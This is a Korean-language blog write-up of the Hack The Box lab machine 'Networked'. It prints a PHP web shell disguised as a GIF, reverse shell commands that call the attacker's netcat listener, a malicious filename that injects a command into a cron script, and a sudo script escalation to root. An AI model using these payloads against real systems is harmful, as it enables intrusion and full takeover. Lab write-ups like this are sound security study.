---
layout: post
title:  "Hack The Box: Networked"
date:   2019-09-24 18:23:03 +0900
categories: Pen-Testing
permalink: /writeup/networked
---

<div style="width: 220px; margin: 0 auto;">
    <script src="https://www.hackthebox.eu/badge/92383"></script>
    <noscript>
        <img src="https://www.hackthebox.eu/badge/image/92383" style="margin: 0 auto;" alt="Hack The Box">
    </noscript>
</div>

## 정보
<div class="modal-header" style="width: 100%; margin: 0 auto;">
<div class="row">
<div class="col-lg-6">
<img src="https://www.hackthebox.eu/storage/avatars/0b286019523dcd78cf03d3a3472a3792.png">
</div> <div class="col-lg-1"></div>
<div class="col-lg-5">
<h2 class="text-center">Networked</h2>
<p> </p>
<div class="table-responsive">
<table class="table table-hover table-striped">
<tbody> <tr> <td class="text-right">OS:</td> <td><img src="https://hackthebox.eu/images/linux.png" height="15"> Linux</td> </tr> <tr> <td class="text-right">Difficulty:</td> <td> <span class="text-success bold">Easy</span></td> </tr> <tr> <td class="text-right">Points:</td> <td><span class="text-success">20</span></td> </tr> <tr> <td class="text-right">Release:</td> <td>24 Aug 2019</td> </tr> <tr> <td class="text-right">IP:</td> <td>10.10.10.146</td> </tr> </tbody> </table> </div> <p></p> </div> </div> <small></small> </div>
## Nmap 스캔
<p>주어진 아이피 정보를 이용하여 네트워크 스캔을 진행하였다.</p>
`nmap -A -v -sV --script vuln 10.10.10.146`

```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-enum:
|   /backup/: Backup folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Nmap done: 1 IP address (1 host up) scanned in 63.85 seconds
```

<p>포트 스캔이 완료된 후</p>
<p>22번 포트에서 ssh서버</p>
<p>80번 포트에서 아파치 웹 서버를 발견하였다.</p>

<p>검색결과를 보던 중, 웹 서버에서 수상한 디렉터리들을 발견하였다.</p>
<p>각각</p>

- /backup/
- /icons/
- /uploads/


## 조사
<p>http://10.10.10.146/backup 주소로 접속 해보니 백업 압축파일을 발견하였다.</p>
<p>압축 해제 후 나온 PHP 코드를 분석 하였다.</p>

```
-rw-r--r--  1 anonymous anonymous  229 Jul  9 20:33 index.php
-rw-r--r--  1 anonymous anonymous 2001 Jul  2 20:38 lib.php
-rw-r--r--  1 anonymous anonymous 1871 Jul  2 21:53 photos.php
-rw-r--r--  1 anonymous anonymous 1331 Jul  2 21:45 upload.php
```
## 악성코드 작성

<p><a href="./upload.php">upload.php</a> 파일 분석 후 예상되는 이미지 업로드 취약점을 토대로 악성코드를 작성하였다.</p>

```
GIF89a?
<?php
system( $_GET[cmd] );
?>
```

<a href="./phpshell.gif">phpshell.gif</a>
<p>물론 업로드가 돼야하기에 파일 확장자를 gif로 만들어놓았다.</p>

## 해킹 & Exploit

<p>코드 이전에 GIF89a? 를 입력함으로써 이것이 이미지 파일이라고 인식시켜 악성코드를 업로드하는데 성공하였음.</p>
![업로드페이지에서 이미지를 업로드 하는 모습.](./images/1.png)
<img src="./images/2.png" style="width: 100%;" alt="업로드 페이지에서 업로드 완료 메시지가 뜬 모습." />

<p>10.10.10.146/photos.php</p>
<img src="./images/3.png" style="width: 100%;" alt="갤러리 페이지에서 악성코드가 업로드된 것을 확인하는 모습." />
<p>필자가 업로드 한 악성코드가 업로드 됐음을 확인 할 수 있음.</p>

<code class="shell-input">nc -lvp 2021</code>
<p>웹 쉘을 탈취하기 위해 필자(공격자) PC에서 netcat 리스닝 2021 포트를 열었다.</p>

<p>이제 올려놓은 악성코드를 이용하여 리버스 쉘을 연결하면.</p>

```
http://10.10.10.146/uploads/10_10_12_226.gif?cmd=nc 10.10.12.226 2021 -c bash
```

<br>
<code>Connection from 10.10.10.146:41584</code>
<p>떳다.</p>

<code class="shell-input">whoami</code>
<br>
<code>apache</code>
<p>apache 권한의 쉘을 탈취하였다</p>

<p>guly 권한을 탈취하기 위해 /home/guly 디렉토리를 살펴보자</p>
<code class="shell-input">ls -al /home/guly</code>

```
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

<p><a href="check_attack.php">check_attack.php</a> 파일과</p>
<p><a href="./crontab.guly">crontab.guly</a> 파일을 추가로 발견하였다.</p>

<p><a href="./crontab.guly">crontab.guly</a>을 이용하여 매 3분마다 <a href="./check_attack.php">check_attack.php</a> 를 실행시키는 듯 하다.</p>

<p><a href="./check_attack.php">check_attack.php</a> 를 보니 Uploads 디렉터리에서 파일 이름을 조금만 손보면 권한 상승이 가능할것 같았다.</p>

<p>/var/www/html/uploads/ 디렉토리에 빈 파일을 생성하였다.</p>
<code class="shell-input">echo "" &gt; ./";nc 10.10.12.226 2022 -c bash"</code>

<p>파일 이름이 잘 설정 되었는지 확인해보자.</p>
<code class="shell-input">ls -al</code>
```
drwxrwxrwx. 2 root   root     266 Sep 13 06:38 .
drwxr-xr-x. 4 root   root     103 Jul  9 13:30 ..
-rw-r--r--  1 apache apache    40 Sep 13 06:26 10_10_12_226.php.gif
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_1.png
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_2.png
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_3.png
-rw-r--r--. 1 root   root    3915 Oct 30  2018 127_0_0_4.png
-rw-r--r--  1 apache apache     1 Sep 13 06:38 ;nc 10.10.12.226 2022 -c bash
-r--r--r--. 1 root   root       2 Oct 30  2018 index.html
```
<p>2022번 포트로 리스닝 nc를 열어놓으면 guly 유저 권한으로 상승 가능할것이다.</p>
<p>cron 스크립트가 돌아올 3분동안 멍이나 때리고 있자.</p>

<br>
<code>Connection from 10.10.10.146:36230</code>
<p>예상대로 3분 안에 2022 포트로 연결이 들어왔다.</p>
<code>
<code class="shell-input">whoami</code>
<code>guly</code>
</code>

<p>guly 유저 권한을 탈취하였다.</p>
<code class="shell-input">cat user.txt</code>

<p>root 권한을 탈취하기 위해서 권한상승에 도움을 줄만한 파일들을 탐색해보았다.</p>
<code class="shell-input">sudo -l</code>

```
Matching Defaults entries for guly on networked:
User guly may run the following commands on networked:
(root) NOPASSWD: /usr/local/sbin/changename.sh
```
<p>비밀번호 없이 실행할 수 있는 파일을 발견했다.</p>

<code class="shell-input">ls -al /usr/local/sbin/changename.sh</code>
<br>
<code>-rwxr-xr-x 1 root root 422 Jul  8 12:34 /usr/local/sbin/changename.sh</code>
<p>/usr/local/sbin/changename.sh 파일을 이용하면 root 권한을 탈취 할 수 있을것이다.</p>

<code class="shell-input">cat /usr/local/sbin/changename.sh</code>

```
#!/bin/bash -p
cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp=&quot;^[a-zA-Z0-9_\ /-]+$&quot;

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo &quot;interface $var:&quot;
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo &quot;wrong input, try again&quot;
		echo &quot;interface $var:&quot;
		read x
	done
	echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

<p>마지막 취약한 부분을 이용하면 root 권한으로 bash 셸을 실행 할 수 있을것같다.</p>
<code class="shell-input">sudo /usr/local/sbin/changename.sh</code>

```
interface NAME:
asd /bin/bash
interface PROXY_METHOD:
asd
interface BROWSER_ONLY:
asd
interface BOOTPROTO:
asd
```

<code><code class="shell-input root">whoami</code>
<code>root</code></code>

<p>root 권한을 탈취하였다.</p>
<p>root.txt 내용을 확인하는 모습.</p>
<code class="shell-input root">cat /root/root.txt </code>

## 마치며
<p>HackTheBox.EU 플랫폼의 Machine 중 처음으로 root 권한을 탈취하였다.</p>
<p>어려운 난이도는 아니었지만 'Networked'로부터 많은 것을 배웠다.</p>

<p>시작이 좋다.</p>

